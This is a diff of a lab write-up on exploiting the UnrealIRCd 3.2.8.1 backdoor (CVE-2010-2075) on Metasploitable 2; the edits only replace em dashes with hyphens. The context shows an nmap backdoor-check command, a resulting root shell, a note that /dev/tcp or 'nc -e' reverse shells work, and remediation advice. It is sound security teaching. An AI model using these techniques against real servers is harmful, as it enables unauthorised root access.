@@ -19,8 +19,8 @@ It went unnoticed for about six months before a user on the Unreal forums notice
 
 Isolated KVM/QEMU lab, no internet routing between VMs.
 
-- **Attacker:** Kali Linux — `192.168.122.50`
-- **Target:** Metasploitable 2 — `192.168.122.100`
+- **Attacker:** Kali Linux - `192.168.122.50`
+- **Target:** Metasploitable 2 - `192.168.122.100`
 - **Tools:** nmap, ncat, Metasploit Framework
 
 ## Discovery
@@ -54,7 +54,7 @@ VERSION
 :irc.Metasploitable.LAN 351 * UnrealIRCd-3.2.8.1. irc.Metasploitable.LAN :FhinIoowz [*=2309]
 ```
 
-`UnrealIRCd-3.2.8.1` — that's the vulnerable version. There's also an Nmap NSE script that confirms exploitability:
+`UnrealIRCd-3.2.8.1` - that's the vulnerable version. There's also an Nmap NSE script that confirms exploitability:
 
 ```bash
 nmap --script irc-unrealircd-backdoor -p 6667 192.168.122.100
@@ -99,7 +99,7 @@ bash: no job control in this shell
 root@metasploitable:/etc/unreal#
 ```
 
-Root shell. The command runs as whatever user the UnrealIRCd process is owned by — on Metasploitable 2 that's root.
+Root shell. The command runs as whatever user the UnrealIRCd process is owned by - on Metasploitable 2 that's root.
 
 I can also use `nc -e` if the target's netcat supports it, but the `/dev/tcp` redirect is more portable and doesn't require a netcat binary with `-e` support.
 
@@ -148,14 +148,14 @@ The process runs as root with no privilege separation whatsoever, which is part 
 
 ## Remediation
 
-1. **Replace UnrealIRCd** — Upgrade to 3.2.8.2 or any later release that was built from verified source. The project provides SHA1 checksums — compare against a copy from an independent source, not the same download server.
-2. **Run IRC as an unprivileged user** — If an IRC server is genuinely needed, it should run as a dedicated low-privilege user, not root. Sandbox it further with a systemd service unit that restricts filesystem access.
-3. **Firewall the IRC port** — Port 6667 should not be reachable from untrusted networks. IRC is typically an internal tool; put it behind a VPN or firewall it to known clients.
-4. **Audit third-party software sources** — Downloaded binaries and source tarballs should have their checksums verified against an out-of-band authoritative source before installation.
+1. **Replace UnrealIRCd** - Upgrade to 3.2.8.2 or any later release that was built from verified source. The project provides SHA1 checksums - compare against a copy from an independent source, not the same download server.
+2. **Run IRC as an unprivileged user** - If an IRC server is genuinely needed, it should run as a dedicated low-privilege user, not root. Sandbox it further with a systemd service unit that restricts filesystem access.
+3. **Firewall the IRC port** - Port 6667 should not be reachable from untrusted networks. IRC is typically an internal tool; put it behind a VPN or firewall it to known clients.
+4. **Audit third-party software sources** - Downloaded binaries and source tarballs should have their checksums verified against an out-of-band authoritative source before installation.
 
 ## References
 
-- [NVD — CVE-2010-2075](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)
+- [NVD - CVE-2010-2075](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)
 - [UnrealIRCd security notice, June 2010](https://www.unrealircd.org/txt/unrealsecadvisory20100612.txt)
 - [Metasploit module: exploit/unix/irc/unreal_ircd_3281_backdoor](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/)
 - [Nmap NSE: irc-unrealircd-backdoor](https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html)
